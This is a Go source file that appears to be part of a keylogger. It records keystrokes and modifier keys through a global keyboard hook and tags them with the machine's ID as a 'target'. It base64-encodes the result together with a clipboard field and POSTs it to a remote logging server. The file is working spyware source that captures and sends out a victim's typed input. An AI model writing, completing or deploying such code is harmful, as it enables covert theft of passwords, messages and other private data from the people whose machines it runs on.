package main

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"strings"
	"time"

	"github.com/denisbrodbeck/machineid"
	hook "github.com/robotn/gohook"
)

// Request body to be used when trying to upload data
type DataUploadRequestBody struct {
	Clipboard []string `json:"c"`
	Data      string   `json:"d"`
	TargetID  string   `json:"t"`
	Timestamp int64    `json:"ts"`
}

// This is marshalled, then encoded using Base64 and used in the network
// request as `Data`
type KeyboardDataStruct struct {
	Contents []string `json:"_"`
}

// Response sent by the remote server. This is the only case where the server
// will send a response.
type ResponseStruct struct {
	ID string `json:"id"`
}

// Returns machine's ID as returned by `machineid`
func getTargetID() string {
	targetID, err := machineid.ID()
	if err != nil {
		log.Panicf("Error: %s", err.Error())
	}

	return targetID
}

// Pushes key data to `localStruct.Contents`
func writeToLocalStruct(
	event hook.Event,
	value string,
	localStruct *KeyboardDataStruct,
) {
	// get a list of modifiers
	modifiers := getModifiers(event)
	modifiersList := strings.Join(modifiers, "+")
	if len(modifiers) > 0 {
		// add a "+" symbol at the end
		modifiersList += "+"
	}

	// push new data
	localStruct.Contents = append(localStruct.Contents,
		fmt.Sprintf("%s%s", modifiersList, value))
}

// Encodes and returns data that will be uploaded to the remote server
func encodeUploadData(data KeyboardDataStruct, targetID string) []byte {
	// marshall `data`
	// this will be base64 encoded and used in `DataUploadRequestBody`
	dataStr, err := json.Marshal(data)
	if err != nil {
		log.Panicf("Error while marshalling data: %s", err.Error())
	}

	// encode `data` using base64
	b64str := base64.StdEncoding.EncodeToString(dataStr)
	var keyData DataUploadRequestBody = DataUploadRequestBody{
		Clipboard: []string{},
		Data:      b64str,
		Timestamp: time.Now().UnixMilli(),
	}

	if len(targetID) > 0 {
		// a target ID was provided
		keyData.TargetID = targetID
	}

	// marshall `keyData`
	jsonStr, err := json.Marshal(keyData)
	if err != nil {
		log.Panicf("Error while marshalling key data: %s", err.Error())
	}

	return jsonStr
}

// `POST`s `encodedData` to `<REMOTE_API_SERVER_URL>/api/log/save`.
// Saves response (if any) to `.tid`.
func uploadData(encodedData []byte) {
	// create the request URL
	apiEndpoint := fmt.Sprintf("%s/api/log/save", REMOTE_API_SERVER_URL)

	// create a new HTTP request
	req, err := http.NewRequest("POST", apiEndpoint, bytes.NewBuffer(encodedData))
	if err != nil {
		log.Panicf("Error while trying to create HTTP request: %s", err.Error())
	}

	// set headers
	req.Header.Set("Content-Type", "application/json")

	// create a new HTTP client and configure it
	client := &http.Client{}
	// see comments on https://stackoverflow.com/a/24455606
	client.Timeout = time.Second * 10
	// do the request
	res, err := client.Do(req)
	if err != nil {
		log.Panicf("Error while trying to upload data: %s", err.Error())
	}
	// resource cleanup
	defer res.Body.Close()

	// status code was not 200
	// this isn't normal
	if res.StatusCode != 200 {
		log.Panicf("Error: unknown error")
	}
}
